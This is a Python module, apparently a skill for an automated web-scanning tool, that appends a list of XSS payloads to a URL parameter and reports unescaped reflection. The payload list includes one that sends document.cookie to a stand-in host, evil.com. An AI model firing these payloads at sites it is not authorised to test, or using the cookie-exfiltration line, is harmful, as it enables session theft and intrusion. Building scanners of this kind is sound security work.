"""Skill: test_xss — reflected, stored, and DOM-based XSS testing."""
from __future__ import annotations
import asyncio
import logging
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

logger = logging.getLogger(__name__)

XSS_PAYLOADS: list[dict[str, str]] = [
    {"payload": "<script>alert(1)</script>", "context": "basic"},
    {"payload": "<img src=x onerror=alert(1)>", "context": "event"},
    {"payload": "<svg/onload=alert(1)>", "context": "svg"},
    {"payload": "\"><script>alert(1)</script>", "context": "attribute_break"},
    {"payload": "javascript:alert(1)", "context": "proto"},
    {"payload": "<body onload=alert(1)>", "context": "event"},
    {"payload": "<input onfocus=alert(1) autofocus>", "context": "event"},
    {"payload": "<details open ontoggle=alert(1)>", "context": "event"},
    {"payload": "<marquee onstart=alert(1)>", "context": "event"},
    {"payload": "'-alert(1)-'", "context": "js_string"},
    {"payload": "`;alert(1)//", "context": "template_literal"},
    {"payload": "${alert(1)}", "context": "template_literal"},
    {"payload": "<iframe src=javascript:alert(1)>", "context": "iframe"},
    {"payload": "<a href=javascript:alert(1)>click</a>", "context": "href"},
    {"payload": "<div style=background:url(javascript:alert(1))>", "context": "css"},
    {"payload": "'><img src=x onerror=alert(1)>", "context": "attribute_break"},
    {"payload": "<script>fetch('http://evil.com/'+document.cookie)</script>", "context": "exfil"},
    {"payload": "<svg><script>alert(1)</script></svg>", "context": "svg_script"},
    {"payload": "%3Cscript%3Ealert(1)%3C/script%3E", "context": "encoded"},
    {"payload": "<math><mi><mglyph><svg><mtext><textarea><path id=x onerror=alert(1)>", "context": "mxss"},
    # --- AUTO-UPDATED PAYLOADS BELOW (managed by growth pipeline) ---
]


async def execute(url: str, param_name: str | None = None, **kwargs: Any) -> dict[str, Any]:
    """Test XSS on a URL with query parameter.

    Returns:
        {"vulnerable": bool, "findings": [...], "tested": int, "url": str}
    """
    import httpx

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if param_name and param_name in params:
        target_param = param_name
    elif params:
        target_param = list(params.keys())[0]
    else:
        target_param = "q"
        params = {"q": [""]}
        parsed = parsed._replace(query="q=")

    findings: list[dict[str, Any]] = []
    tested = 0
    sem = asyncio.Semaphore(15)

    async with httpx.AsyncClient(timeout=10, verify=False) as client:
        try:
            base_r = await client.get(url)
            baseline_body = base_r.text.lower()
        except Exception as e:
            return {"vulnerable": False, "findings": [], "tested": 0, "url": url, "error": str(e)}

        async def test_payload(p: dict[str, str]) -> None:
            nonlocal tested
            async with sem:
                tested += 1
                new_params = dict(params)
                orig = new_params[target_param][0] if new_params[target_param] else ""
                new_params[target_param] = [orig + p["payload"]]
                query = urlencode({k: v[0] for k, v in new_params.items()})
                test_url = urlunparse(parsed._replace(query=query))

                try:
                    r = await client.get(test_url, timeout=10)
                except Exception:
                    return

                body = r.text
                # Check if payload reflected unescaped
                if p["payload"].lower() in body.lower():
                    findings.append({
                        "type": f"xss_{p['context']}",
                        "payload": p["payload"],
                        "param": target_param,
                        "evidence": f"Payload reflected unescaped in response (status {r.status_code})",
                        "response_preview": body[:300],
                        "severity": "high",
                    })
                    logger.info("XSS found: %s on param %s", p["context"], target_param)

        await asyncio.gather(*[test_payload(p) for p in XSS_PAYLOADS])

    # Deduplicate by context
    seen: set[str] = set()
    unique: list[dict[str, Any]] = []
    for f in findings:
        key = f"{f['type']}:{f['param']}"
        if key not in seen:
            seen.add(key)
            unique.append(f)

    return {"vulnerable": len(unique) > 0, "findings": unique, "tested": tested, "url": url, "param": target_param}
